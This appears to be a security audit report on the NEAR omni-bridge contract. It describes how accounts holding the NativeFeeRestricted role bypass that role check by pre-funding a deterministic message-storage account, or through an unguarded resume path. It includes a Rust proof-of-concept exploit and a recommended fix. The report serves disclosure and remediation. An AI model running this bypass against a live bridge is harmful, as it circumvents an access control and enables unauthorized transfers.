Audit Report

## Title
`NativeFeeRestricted` Role Bypass via Message-Account Pre-Funding in `init_transfer` - (File: near/omni-bridge/src/lib.rs)

## Summary

The `NativeFeeRestricted` role check in `init_transfer` only guards one of three execution paths. An attacker holding the `NativeFeeRestricted` role can bypass the check entirely by pre-funding the deterministic virtual message-storage account via `storage_deposit` before calling `ft_transfer_call`, causing `try_to_transfer_balance_from_message_account` to succeed and short-circuit the role check. The `init_transfer_resume` yield path is also completely unguarded.

## Finding Description

In `near/omni-bridge/src/lib.rs` at lines 566–584, `init_transfer` selects one of three paths via a short-circuit `||` condition:

```rust
if self
    .try_to_transfer_balance_from_message_account(...)  // Path 1 — NO role check
    .is_ok()
    || (self.has_storage_balance(...)
        && (init_transfer_msg.native_token_fee.0 == 0
            || !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone())))  // Path 2 — role checked
{
    ...
} else {
    // Path 3: yield/resume — init_transfer_resume has NO role check
}
```

**Path 1 bypass:** The virtual message-storage account ID (`message_storage_account_id`) is computed in `near/omni-types/src/lib.rs` at `TransferMessageStorageAccount::id` as a SHA256 hash of `(token, amount, recipient, fee, sender, msg)` plus optional `external_id`. Nonces are excluded from the hash, making the account ID fully deterministic and computable off-chain before the transfer is submitted.

`storage_deposit` in `near/omni-bridge/src/storage.rs` at lines 141–169 accepts an arbitrary `account_id` parameter with no restrictions, allowing anyone to fund any account ID — including the virtual message-storage account. Once funded, `try_to_transfer_balance_from_message_account` at lines 260–290 succeeds (the message account has balance ≥ `native_fee` and the storage payer is registered), returning `Ok(())` and causing Path 1 to be taken, completely skipping the `NativeFeeRestricted` check.

**Path 3 bypass:** If Path 1 fails and Path 2 fails (e.g., the attacker has no own storage balance), execution falls into the yield path. `init_transfer_resume` at lines 621–646 calls `try_to_transfer_balance_from_message_account` directly with no `NativeFeeRestricted` check whatsoever.

## Impact Explanation

This is a role/authorization bypass matching the Critical impact category: "Unauthorized transaction, authorization bypass, role bypass... that lets an attacker execute bridge... actions." The `NativeFeeRestricted` role is an explicit on-chain authorization control. Both bypass paths allow a restricted account to initiate a bridge transfer with a non-zero `native_token_fee`, violating the role's enforced invariant through standard public contract calls.

## Likelihood Explanation

The bypass is fully attacker-controlled and requires no privileged access beyond holding the `NativeFeeRestricted` role. The virtual account ID is deterministic and computable from public on-chain parameters before the transfer is submitted. The attack requires only two sequential standard on-chain calls (`storage_deposit` then `ft_transfer_call`) with no special timing, race conditions, or external dependencies.

## Recommendation

Add the `NativeFeeRestricted` check unconditionally at the top of `init_transfer`, before the three-way branch, so no path can bypass it:

```rust
fn init_transfer(...) -> PromiseOrPromiseIndexOrValue<U128> {
    if init_transfer_msg.native_token_fee.0 > 0 {
        require!(
            !self.acl_has_role(Role::NativeFeeRestricted.into(), signer_id.clone()),
            BridgeError::NativeFeeNotAllowed.as_ref()
        );
    }
    // ... rest of the function
}
```

Equivalently, add the same guard at the start of `init_transfer_resume` to protect the yield path.

## Proof of Concept

```rust
// Attacker: account with NativeFeeRestricted role
// Step 1: compute the deterministic virtual account ID off-chain
let storage_account = TransferMessageStorageAccount {
    token: OmniAddress::Near(token_id.clone()),
    amount: U128(transfer_amount),
    recipient: eth_recipient.clone(),
    fee: Fee { fee: U128(0), native_fee: U128(native_fee_amount) },
    sender: OmniAddress::Near(attacker_id.clone()),
    msg: String::new(),
};
let virtual_acct_id = storage_account.id(None);

// Step 2: pre-fund the virtual account via storage_deposit (no role check here)
attacker.call(bridge.id(), "storage_deposit")
    .args_json(json!({ "account_id": virtual_acct_id }))
    .deposit(native_fee_amount + required_storage)
    .transact().await?;

// Step 3: initiate transfer with non-zero native_token_fee
// try_to_transfer_balance_from_message_account succeeds → Path 1 taken
// NativeFeeRestricted check is never reached
attacker.call(token.id(), "ft_transfer_call")
    .args_json(json!({
        "receiver_id": bridge.id(),
        "amount": U128(transfer_amount),
        "msg": serde_json::to_string(&InitTransferMsg {
            native_token_fee: U128(native_fee_amount),
            fee: U128(0),
            recipient: eth_recipient,
            msg: None,
            external_id: None,
        })?,
    }))
    .deposit(NearToken::from_yoctonear(1))
    .transact().await?;
// Transfer accepted with non-zero native_token_fee despite NativeFeeRestricted role
```

The existing integration test in `near/omni-tests/src/native_fee_role.rs` (`test_native_fee_restriction`) only tests Path 2 (own storage balance path) and does not cover the pre-funded message-account path, confirming the bypass is untested.
